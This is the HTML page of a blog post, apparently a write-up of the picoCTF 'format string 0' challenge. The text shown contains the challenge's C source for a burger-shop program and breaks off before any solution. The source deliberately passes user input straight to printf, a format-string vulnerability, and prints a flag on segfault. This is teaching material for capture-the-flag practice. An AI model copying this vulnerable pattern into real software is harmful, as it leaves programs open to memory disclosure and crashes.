<!doctype html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="/images/favicon.png" />

<title>[picoCTF] format string 0 &amp; 1&nbsp;|&nbsp;Wook&#39;s blog</title>
<meta
  name="title"
  content="[picoCTF] format string 0 &amp; 1"
/>
<meta
  name="description"
  content="format string 0 Author: CHENG ZHANG
Description Can you use your knowledge of format strings to make the customers happy?
Here&rsquo;s the provided source code:
1#include &lt;stdio.h&gt; 2#include &lt;stdlib.h&gt; 3#include &lt;string.h&gt; 4#include &lt;signal.h&gt; 5#include &lt;unistd.h&gt; 6#include &lt;sys/types.h&gt; 7 8#define BUFSIZE 32 9#define FLAGSIZE 64 10 11char flag[FLAGSIZE]; 12 13void sigsegv_handler(int sig) { 14 printf(&#34;\n%s\n&#34;, flag); 15 fflush(stdout); 16 exit(1); 17} 18 19int on_menu(char *burger, char *menu[], int count) { 20 for (int i = 0; i &lt; count; i&#43;&#43;) { 21 if (strcmp(burger, menu[i]) == 0) 22 return 1; 23 } 24 return 0; 25} 26 27void serve_patrick(); 28 29void serve_bob(); 30 31 32int main(int argc, char **argv){ 33 FILE *f = fopen(&#34;flag."
/>
<meta
  name="keywords"
  content="picoCTF,"
/>

  <meta name="author" content="Wook Lee" />




<meta property="og:url" content="http://localhost:1313/picoctf-format-string-0-1/">
  <meta property="og:site_name" content="Wook&#39;s blog">
  <meta property="og:title" content="[picoCTF] format string 0 &amp; 1">
  <meta property="og:description" content="format string 0 Author: CHENG ZHANG
Description Can you use your knowledge of format strings to make the customers happy?
Here’s the provided source code:
1#include &lt;stdio.h&gt; 2#include &lt;stdlib.h&gt; 3#include &lt;string.h&gt; 4#include &lt;signal.h&gt; 5#include &lt;unistd.h&gt; 6#include &lt;sys/types.h&gt; 7 8#define BUFSIZE 32 9#define FLAGSIZE 64 10 11char flag[FLAGSIZE]; 12 13void sigsegv_handler(int sig) { 14 printf(&#34;\n%s\n&#34;, flag); 15 fflush(stdout); 16 exit(1); 17} 18 19int on_menu(char *burger, char *menu[], int count) { 20 for (int i = 0; i &lt; count; i&#43;&#43;) { 21 if (strcmp(burger, menu[i]) == 0) 22 return 1; 23 } 24 return 0; 25} 26 27void serve_patrick(); 28 29void serve_bob(); 30 31 32int main(int argc, char **argv){ 33 FILE *f = fopen(&#34;flag.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2024-07-06T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-07-06T00:00:00+00:00">
    <meta property="article:tag" content="picoCTF">





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="[picoCTF] format string 0 &amp; 1">
  <meta name="twitter:description" content="format string 0 Author: CHENG ZHANG
Description Can you use your knowledge of format strings to make the customers happy?
Here’s the provided source code:
1#include &lt;stdio.h&gt; 2#include &lt;stdlib.h&gt; 3#include &lt;string.h&gt; 4#include &lt;signal.h&gt; 5#include &lt;unistd.h&gt; 6#include &lt;sys/types.h&gt; 7 8#define BUFSIZE 32 9#define FLAGSIZE 64 10 11char flag[FLAGSIZE]; 12 13void sigsegv_handler(int sig) { 14 printf(&#34;\n%s\n&#34;, flag); 15 fflush(stdout); 16 exit(1); 17} 18 19int on_menu(char *burger, char *menu[], int count) { 20 for (int i = 0; i &lt; count; i&#43;&#43;) { 21 if (strcmp(burger, menu[i]) == 0) 22 return 1; 23 } 24 return 0; 25} 26 27void serve_patrick(); 28 29void serve_bob(); 30 31 32int main(int argc, char **argv){ 33 FILE *f = fopen(&#34;flag.">





  <meta itemprop="name" content="[picoCTF] format string 0 &amp; 1">
  <meta itemprop="description" content="format string 0 Author: CHENG ZHANG
Description Can you use your knowledge of format strings to make the customers happy?
Here’s the provided source code:
1#include &lt;stdio.h&gt; 2#include &lt;stdlib.h&gt; 3#include &lt;string.h&gt; 4#include &lt;signal.h&gt; 5#include &lt;unistd.h&gt; 6#include &lt;sys/types.h&gt; 7 8#define BUFSIZE 32 9#define FLAGSIZE 64 10 11char flag[FLAGSIZE]; 12 13void sigsegv_handler(int sig) { 14 printf(&#34;\n%s\n&#34;, flag); 15 fflush(stdout); 16 exit(1); 17} 18 19int on_menu(char *burger, char *menu[], int count) { 20 for (int i = 0; i &lt; count; i&#43;&#43;) { 21 if (strcmp(burger, menu[i]) == 0) 22 return 1; 23 } 24 return 0; 25} 26 27void serve_patrick(); 28 29void serve_bob(); 30 31 32int main(int argc, char **argv){ 33 FILE *f = fopen(&#34;flag.">
  <meta itemprop="datePublished" content="2024-07-06T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-07-06T00:00:00+00:00">
  <meta itemprop="wordCount" content="959">
  <meta itemprop="keywords" content="picoCTF">
<meta name="referrer" content="no-referrer-when-downgrade" />

    
    <link href="/simple.min.css" rel="stylesheet" />

    
    <link href="/style.min.css" rel="stylesheet" />

    

    
</head>

  <body>
    <header>
      <nav>
  <a
    href="/"
    
    >Home</a
  >

  <a
    href="/blog/"
    
    >Blog</a
  >

  <a
    href="/photos/"
    
    >Photos</a
  >


  <a href="/index.xml">
    <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 448 512">
      
      <path
        d="M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM0 416a64 64 0 1 1 128 0A64 64 0 1 1 0 416zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z"
      />
    </svg>
    RSS
  </a>

</nav>

<h1>[picoCTF] format string 0 &amp; 1</h1>


    </header>
    <main>
      
  
    
      
      <p>
        <i>
          <time datetime="2024-07-06" pubdate>
            2024-07-06
          </time>
        </i>
      </p>
    
  
  
  <content>
    <h3 id="format-string-0">format string 0</h3>
<p><em>Author: CHENG ZHANG</em></p>
<h3 id="description">Description</h3>
<p>Can you use your knowledge of format strings to make the customers happy?</p>
<p>Here&rsquo;s the provided source code:</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  1</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  2</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  3</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;string.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  4</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;signal.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  5</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;unistd.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  6</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;sys/types.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  7</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  8</span><span><span style="color:#6c7086;font-style:italic">#define BUFSIZE 32
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  9</span><span><span style="color:#6c7086;font-style:italic">#define FLAGSIZE 64
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 10</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 11</span><span><span style="color:#f38ba8">char</span> flag[FLAGSIZE];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 13</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">sigsegv_handler</span>(<span style="color:#f38ba8">int</span> sig) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 14</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">%s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, flag);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 15</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 16</span><span>    <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">1</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 17</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 19</span><span><span style="color:#f38ba8">int</span> <span style="color:#89b4fa">on_menu</span>(<span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>burger, <span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>menu[], <span style="color:#f38ba8">int</span> count) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 20</span><span>    <span style="color:#cba6f7">for</span> (<span style="color:#f38ba8">int</span> i <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#fab387">0</span>; i <span style="color:#89dceb;font-weight:bold">&lt;</span> count; i<span style="color:#89dceb;font-weight:bold">++</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 21</span><span>        <span style="color:#cba6f7">if</span> (<span style="color:#89b4fa">strcmp</span>(burger, menu[i]) <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#fab387">0</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 22</span><span>            <span style="color:#cba6f7">return</span> <span style="color:#fab387">1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 23</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 24</span><span>    <span style="color:#cba6f7">return</span> <span style="color:#fab387">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 25</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 27</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">serve_patrick</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 29</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">serve_bob</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 30</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 31</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 32</span><span><span style="color:#f38ba8">int</span> <span style="color:#89b4fa">main</span>(<span style="color:#f38ba8">int</span> argc, <span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">**</span>argv){
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 33</span><span>    FILE <span style="color:#89dceb;font-weight:bold">*</span>f <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">fopen</span>(<span style="color:#a6e3a1">&#34;flag.txt&#34;</span>, <span style="color:#a6e3a1">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 34</span><span>    <span style="color:#cba6f7">if</span> (f <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#89dceb">NULL</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 35</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;%s %s&#34;</span>, <span style="color:#a6e3a1">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 36</span><span>                        <span style="color:#a6e3a1">&#34;own debugging flag.</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 37</span><span>        <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 38</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 39</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 40</span><span>    <span style="color:#89b4fa">fgets</span>(flag, FLAGSIZE, f);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 41</span><span>    <span style="color:#89b4fa">signal</span>(SIGSEGV, sigsegv_handler);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 42</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 43</span><span>    <span style="color:#f38ba8">gid_t</span> gid <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">getegid</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 44</span><span>    <span style="color:#89b4fa">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 45</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 46</span><span>    <span style="color:#89b4fa">serve_patrick</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 47</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 48</span><span>    <span style="color:#cba6f7">return</span> <span style="color:#fab387">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 49</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 50</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 51</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">serve_patrick</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 52</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;%s %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">%s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">%s %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">%s&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 53</span><span>            <span style="color:#a6e3a1">&#34;Welcome to our newly-opened burger place Pico &#39;n Patty!&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 54</span><span>            <span style="color:#a6e3a1">&#34;Can you help the picky customers find their favorite burger?&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 55</span><span>            <span style="color:#a6e3a1">&#34;Here comes the first customer Patrick who wants a giant bite.&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 56</span><span>            <span style="color:#a6e3a1">&#34;Please choose from the following burgers:&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 57</span><span>            <span style="color:#a6e3a1">&#34;Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 58</span><span>            <span style="color:#a6e3a1">&#34;Enter your recommendation: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 59</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 60</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 61</span><span>    <span style="color:#f38ba8">char</span> choice1[BUFSIZE];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 62</span><span>    <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, choice1);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 63</span><span>    <span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>menu1[<span style="color:#fab387">3</span>] <span style="color:#89dceb;font-weight:bold">=</span> {<span style="color:#a6e3a1">&#34;Breakf@st_Burger&#34;</span>, <span style="color:#a6e3a1">&#34;Gr%114d_Cheese&#34;</span>, <span style="color:#a6e3a1">&#34;Bac0n_D3luxe&#34;</span>};
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 64</span><span>    <span style="color:#cba6f7">if</span> (<span style="color:#89dceb;font-weight:bold">!</span><span style="color:#89b4fa">on_menu</span>(choice1, menu1, <span style="color:#fab387">3</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 65</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, <span style="color:#a6e3a1">&#34;There is no such burger yet!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 66</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 67</span><span>    } <span style="color:#cba6f7">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 68</span><span>        <span style="color:#f38ba8">int</span> count <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">printf</span>(choice1);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 69</span><span>        <span style="color:#cba6f7">if</span> (count <span style="color:#89dceb;font-weight:bold">&gt;</span> <span style="color:#fab387">2</span> <span style="color:#89dceb;font-weight:bold">*</span> BUFSIZE) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 70</span><span>            <span style="color:#89b4fa">serve_bob</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 71</span><span>        } <span style="color:#cba6f7">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 72</span><span>            <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;%s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">%s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 73</span><span>                    <span style="color:#a6e3a1">&#34;Patrick is still hungry!&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 74</span><span>                    <span style="color:#a6e3a1">&#34;Try to serve him something of larger size!&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 75</span><span>            <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 76</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 77</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 78</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 79</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 80</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">serve_bob</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 81</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">%s %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">%s %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">%s %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">%s&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 82</span><span>            <span style="color:#a6e3a1">&#34;Good job! Patrick is happy!&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 83</span><span>            <span style="color:#a6e3a1">&#34;Now can you serve the second customer?&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 84</span><span>            <span style="color:#a6e3a1">&#34;Sponge Bob wants something outrageous that would break the shop&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 85</span><span>            <span style="color:#a6e3a1">&#34;(better be served quick before the shop owner kicks you out!)&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 86</span><span>            <span style="color:#a6e3a1">&#34;Please choose from the following burgers:&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 87</span><span>            <span style="color:#a6e3a1">&#34;Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 88</span><span>            <span style="color:#a6e3a1">&#34;Enter your recommendation: &#34;</span>);
